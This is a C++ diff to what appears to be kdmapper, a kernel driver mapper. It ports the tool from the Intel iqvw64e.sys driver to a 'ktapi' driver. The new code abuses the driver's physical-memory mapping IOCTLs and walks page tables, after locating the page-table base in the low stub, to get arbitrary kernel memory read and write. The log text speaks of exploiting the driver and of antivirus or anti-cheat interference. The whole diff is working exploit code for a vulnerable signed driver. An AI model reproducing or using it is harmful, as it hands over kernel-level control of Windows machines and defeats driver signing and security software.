@@ -2,6 +2,9 @@
 #include <Windows.h>
 #include <string>
 #include <fstream>
+#include <algorithm>
+#include <cstring>
+#include <vector>
 
 #include "utils.hpp"
 #include "intel_driver_resource.hpp"
@@ -16,57 +19,25 @@
 /**
  Command structures
 */
-typedef struct _COPY_MEMORY_BUFFER_INFO
+typedef struct _KTAPI_MAP_REQUEST
 {
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t source;
-	uint64_t destination;
-	uint64_t length;
-}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;
+	uint32_t interface_type;
+	uint32_t bus_number;
+	uint64_t bus_address;
+	uint32_t address_space;
+	uint32_t view_size;
+}KTAPI_MAP_REQUEST, * PKTAPI_MAP_REQUEST;
 
-typedef struct _FILL_MEMORY_BUFFER_INFO
+typedef struct _KTAPI_UNMAP_REQUEST
 {
-	uint64_t case_number;
-	uint64_t reserved1;
-	uint32_t value;
-	uint32_t reserved2;
-	uint64_t destination;
-	uint64_t length;
-}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;
-
-typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t return_physical_address;
-	uint64_t address_to_translate;
-}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;
-
-typedef struct _MAP_IO_SPACE_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t return_value;
-	uint64_t return_virtual_address;
-	uint64_t physical_address_to_map;
-	uint32_t size;
-}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;
-
-typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved1;
-	uint64_t reserved2;
-	uint64_t virt_address;
-	uint64_t reserved3;
-	uint32_t number_of_bytes;
-}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;
+	uint64_t base_address;
+}KTAPI_UNMAP_REQUEST, * PKTAPI_UNMAP_REQUEST;
 
 // End Command structures
 
 HANDLE intel_driver::hDevice = 0;
 ULONG64 intel_driver::ntoskrnlAddr = 0;
+ULONG64 intel_driver::pagingBase = 0;
 std::string cachedDriverName = "";
 
 std::wstring intel_driver::GetDriverNameW() {
@@ -95,7 +66,7 @@ std::wstring intel_driver::GetDriverPath() {
 }
 
 bool intel_driver::IsRunning() {
-	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+	const HANDLE file_handle = CreateFileW(L"\\\\.\\ktapi", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(file_handle);
@@ -126,10 +97,10 @@ NTSTATUS intel_driver::Load() {
 
 	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
 	if (intel_driver::IsRunning()) {
-		kdmLog(L"[-] \\Device\\Nal is already in use." << std::endl);
-		kdmLog(L"[-] This means that there is a intel driver already loaded or another instance of kdmapper is running or kdmapper crashed and didn't unload the previous driver." << std::endl);
+		kdmLog(L"[-] \\Device\\ktapi is already in use." << std::endl);
+		kdmLog(L"[-] This means that a ktapi driver already loaded or another instance of kdmapper is running or kdmapper crashed and didn't unload the previous driver." << std::endl);
 		kdmLog(L"[-] If you are sure that there is no other instance of kdmapper running, you can try to restart your computer to fix this issue." << std::endl);
-		kdmLog(L"[-] If the problem persists, you can try to unload the intel driver manually (If the driver was loaded with kdmapper will have a random name and will be located in %temp%), if not, the driver name is iqvw64e.sys." << std::endl);
+		kdmLog(L"[-] If the problem persists, you can try to unload the ktapi driver manually (If the driver was loaded with kdmapper will have a random name and will be located in %temp%)." << std::endl);
 		return STATUS_ALREADY_REGISTERED;
 	}
 
@@ -162,11 +133,11 @@ NTSTATUS intel_driver::Load() {
 		return status;
 	}
 
-	hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	hDevice = CreateFileW(L"\\\\.\\ktapi", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
-		kdmLog(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
+		kdmLog(L"[-] Failed to load driver ktapi.sys" << std::endl);
 		intel_driver::Unload();
 		return STATUS_NOT_FOUND;
 	}
@@ -178,10 +149,16 @@ NTSTATUS intel_driver::Load() {
 		return STATUS_BAD_DLL_ENTRYPOINT;
 	}
 
+	if (!intel_driver::LocatePagingBase()) {
+		kdmLog(L"[-] Failed to locate the page table base, ktapi cannot translate kernel addresses" << std::endl);
+		intel_driver::Unload();
+		return STATUS_UNSUCCESSFUL;
+	}
+
 	//check MZ ntoskrnl.exe
 	IMAGE_DOS_HEADER dosHeader = { 0 };
 	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
-		kdmLog(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
+		kdmLog(L"[-] Can't exploit ktapi driver, is there any antivirus or anticheat running?" << std::endl);
 		intel_driver::Unload();
 		return STATUS_INVALID_IMAGE_FORMAT;
 	}
@@ -368,7 +345,10 @@ NTSTATUS intel_driver::Unload() {
 
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
 		CloseHandle(hDevice);
+		hDevice = 0;
 	}
+
+	intel_driver::pagingBase = 0;
 
 	auto status = service::StopAndRemove(GetDriverNameW());
 	if (!NT_SUCCESS(status))
@@ -404,124 +384,218 @@ NTSTATUS intel_driver::Unload() {
 	return STATUS_SUCCESS;
 }
 
+uint64_t intel_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
+	if (!size)
+		return 0;
+
+	const uint64_t offset = physical_address & 0xFFF;
+	const uint64_t span = offset + size;
+	const uint64_t view_size = ((span + 0xFFF) & ~0xFFFull);
+
+	KTAPI_MAP_REQUEST map_request = { 0 };
+	map_request.bus_address = physical_address & ~0xFFFull;
+	map_request.view_size = static_cast<uint32_t>(view_size);
+
+	uint64_t view_base = 0;
+	DWORD bytes_returned = 0;
+
+	if (!DeviceIoControl(hDevice, ioctl_map, &map_request, sizeof(map_request), &view_base, sizeof(view_base), &bytes_returned, nullptr))
+		return 0;
+
+	return view_base;
+}
+
+bool intel_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
+	UNREFERENCED_PARAMETER(size);
+
+	if (!address)
+		return false;
+
+	KTAPI_UNMAP_REQUEST unmap_request = { 0 };
+	unmap_request.base_address = address;
+
+	DWORD bytes_returned = 0;
+
+	return DeviceIoControl(hDevice, ioctl_unmap, &unmap_request, sizeof(unmap_request), &unmap_request, sizeof(unmap_request), &bytes_returned, nullptr) != FALSE;
+}
+
 bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
 	if (!destination || !source || !size)
 		return 0;
 
-	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };
-
-	copy_memory_buffer.case_number = 0x33;
-	copy_memory_buffer.source = source;
-	copy_memory_buffer.destination = destination;
-	copy_memory_buffer.length = size;
-
-	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
+	return WriteMemory(destination, reinterpret_cast<void*>(source), size);
 }
 
 bool intel_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
 	if (!address || !size)
 		return 0;
 
-	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };
-
-	fill_memory_buffer.case_number = 0x30;
-	fill_memory_buffer.destination = address;
-	fill_memory_buffer.value = value;
-	fill_memory_buffer.length = size;
-
-	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
+	std::vector<uint8_t> pattern(static_cast<size_t>(size), static_cast<uint8_t>(value));
+	return WriteMemory(address, pattern.data(), size);
 }
 
-bool intel_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
-	if (!address)
+namespace {
+	constexpr uint64_t kPageSize = 0x1000;
+	constexpr uint64_t kPageMask = ~(kPageSize - 1);
+	constexpr uint64_t kAddressMask = 0x000FFFFFFFFFF000ull;
+
+	constexpr uint64_t kPresent = 1ull << 0;
+	constexpr uint64_t kLargePage = 1ull << 7;
+
+	constexpr uint64_t kLowStubLimit = 0x100000;
+	constexpr uint64_t kStartSignature = 0x000001000600E9ull;
+	constexpr uint64_t kStartMask = 0xFFFFFFFFFFFF00FFull;
+	constexpr uint64_t kKernelEntry = 0xFFFFF80000000000ull;
+	constexpr uint64_t kKernelEntryMask = 0xFFFFF80000000003ull;
+	constexpr uint64_t kPml4Mask = 0xFFFFFF0000000FFFull;
+	constexpr uint64_t kStartBlockEntryOffset = 0x070;
+	constexpr uint64_t kStartBlockPml4Offset = 0x0A0;
+
+	bool ReadPhysicalBytes(uint64_t physical_address, void* buffer, size_t size) {
+		const uint64_t view = intel_driver::MapIoSpace(physical_address, static_cast<uint32_t>(size));
+		if (!view)
+			return false;
+
+		memcpy(buffer, reinterpret_cast<void*>(view + (physical_address & 0xFFF)), size);
+		intel_driver::UnmapIoSpace(view, static_cast<uint32_t>(size));
+		return true;
+	}
+
+	bool WritePhysicalBytes(uint64_t physical_address, const void* buffer, size_t size) {
+		const uint64_t view = intel_driver::MapIoSpace(physical_address, static_cast<uint32_t>(size));
+		if (!view)
+			return false;
+
+		memcpy(reinterpret_cast<void*>(view + (physical_address & 0xFFF)), buffer, size);
+		intel_driver::UnmapIoSpace(view, static_cast<uint32_t>(size));
+		return true;
+	}
+
+	uint64_t Smallest(uint64_t left, uint64_t right) {
+		return left < right ? left : right;
+	}
+}
+
+uint64_t intel_driver::VirtualToPhysical(uint64_t virtual_address) {
+	if (!intel_driver::pagingBase)
 		return 0;
 
-	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };
+	const uint64_t shifts[4] = { 39, 30, 21, 12 };
+	uint64_t table = intel_driver::pagingBase;
 
-	get_phys_address_buffer.case_number = 0x25;
-	get_phys_address_buffer.address_to_translate = address;
+	for (int level = 0; level < 4; ++level) {
+		const uint64_t shift = shifts[level];
+		const uint64_t entry_address = table + ((virtual_address >> shift) & 0x1FF) * 8;
 
-	DWORD bytes_returned = 0;
+		uint64_t entry = 0;
+		if (!ReadPhysicalBytes(entry_address, &entry, sizeof(entry)))
+			return 0;
 
-	if (!DeviceIoControl(hDevice, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
+		if (!(entry & kPresent))
+			return 0;
+
+		const bool last = (level == 3);
+		if (!last && level > 0 && (entry & kLargePage)) {
+			const uint64_t base = entry & kAddressMask & ~((1ull << shift) - 1);
+			return base + (virtual_address & ((1ull << shift) - 1));
+		}
+
+		if (last)
+			return (entry & kAddressMask) + (virtual_address & 0xFFF);
+
+		table = entry & kAddressMask;
+		if (!table)
+			return 0;
+	}
+
+	return 0;
+}
+
+bool intel_driver::LocatePagingBase() {
+	if (intel_driver::pagingBase)
+		return true;
+
+	std::vector<uint8_t> low_stub(static_cast<size_t>(kLowStubLimit), 0);
+	if (!ReadPhysicalBytes(0, low_stub.data(), low_stub.size())) {
+		kdmLog(L"[-] Failed to map the low stub" << std::endl);
 		return false;
+	}
 
-	*out_physical_address = get_phys_address_buffer.return_physical_address;
-	return true;
-}
+	const auto read64 = [&](uint64_t offset) -> uint64_t {
+		uint64_t value = 0;
+		memcpy(&value, low_stub.data() + offset, sizeof(value));
+		return value;
+	};
 
-uint64_t intel_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
-	if (!physical_address || !size)
-		return 0;
+	for (uint64_t block = kPageSize; block + kStartBlockPml4Offset + 8 <= kLowStubLimit; block += kPageSize) {
+		if ((read64(block) & kStartMask) != kStartSignature)
+			continue;
 
-	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };
+		if ((read64(block + kStartBlockEntryOffset) & kKernelEntryMask) != kKernelEntry)
+			continue;
 
-	map_io_space_buffer.case_number = 0x19;
-	map_io_space_buffer.physical_address_to_map = physical_address;
-	map_io_space_buffer.size = size;
+		const uint64_t directory_table_base = read64(block + kStartBlockPml4Offset);
+		if (directory_table_base & kPml4Mask)
+			continue;
 
-	DWORD bytes_returned = 0;
+		intel_driver::pagingBase = directory_table_base & kPageMask;
+		kdmLog(L"[+] Page table base 0x" << reinterpret_cast<void*>(intel_driver::pagingBase) << std::endl);
+		return true;
+	}
 
-	if (!DeviceIoControl(hDevice, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
-		return 0;
-
-	return map_io_space_buffer.return_virtual_address;
-}
-
-bool intel_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
-	if (!address || !size)
-		return false;
-
-	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };
-
-	unmap_io_space_buffer.case_number = 0x1A;
-	unmap_io_space_buffer.virt_address = address;
-	unmap_io_space_buffer.number_of_bytes = size;
-
-	DWORD bytes_returned = 0;
-
-	return DeviceIoControl(hDevice, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
+	kdmLog(L"[-] No PROCESSOR_START_BLOCK satisfies the low stub predicates" << std::endl);
+	return false;
 }
 
 bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
-	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
+	if (!address || !buffer || !size)
+		return false;
+
+	uint8_t* out = reinterpret_cast<uint8_t*>(buffer);
+	uint64_t done = 0;
+
+	while (done < size) {
+		const uint64_t current = address + done;
+		const uint64_t offset = current & 0xFFF;
+		const uint64_t chunk = Smallest(kPageSize - offset, size - done);
+
+		const uint64_t physical = VirtualToPhysical(current);
+		if (!physical || !ReadPhysicalBytes(physical, out + done, static_cast<size_t>(chunk)))
+			return false;
+
+		done += chunk;
+	}
+
+	return true;
 }
 
 bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
-	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
+	if (!address || !buffer || !size)
+		return false;
+
+	const uint8_t* in = reinterpret_cast<const uint8_t*>(buffer);
+	uint64_t done = 0;
+
+	while (done < size) {
+		const uint64_t current = address + done;
+		const uint64_t offset = current & 0xFFF;
+		const uint64_t chunk = Smallest(kPageSize - offset, size - done);
+
+		const uint64_t physical = VirtualToPhysical(current);
+		if (!physical || !WritePhysicalBytes(physical, in + done, static_cast<size_t>(chunk)))
+			return false;
+
+		done += chunk;
+	}
+
+	return true;
 }
 
 bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
 	if (!address || !buffer || !size)
 		return false;
 
-	uint64_t physical_address = 0;
-
-	if (!GetPhysicalAddress(address, &physical_address)) {
-		kdmLog(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
-		return false;
-	}
-
-	const uint64_t mapped_physical_memory = MapIoSpace(physical_address, size);
-
-	if (!mapped_physical_memory) {
-		kdmLog(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
-		return false;
-	}
-
-	bool result = WriteMemory(mapped_physical_memory, buffer, size);
-
-#if defined(DISABLE_OUTPUT)
-	UnmapIoSpace(mapped_physical_memory, size);
-#else
-	if (!UnmapIoSpace(mapped_physical_memory, size))
-		kdmLog(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
-#endif
-
-
-	return result;
+	return WriteMemory(address, buffer, size);
 }
 
 uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
